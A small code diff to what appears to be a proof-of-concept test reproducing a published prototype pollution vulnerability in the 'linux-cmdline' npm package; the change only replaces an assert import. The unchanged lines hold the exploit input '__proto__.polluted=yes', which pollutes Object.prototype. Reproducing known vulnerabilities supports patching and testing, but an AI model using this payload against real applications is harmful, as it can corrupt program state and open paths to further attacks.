@@ -1,7 +1,7 @@
 //https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
 
 const linuxCmdline = require('linux-cmdline');
-const { assert } = require("@firebase/util");
+const assert = require('assert');
 var obj = {}
 console.log("Before : " + obj.polluted);
 linuxCmdline('__proto__.polluted=yes');
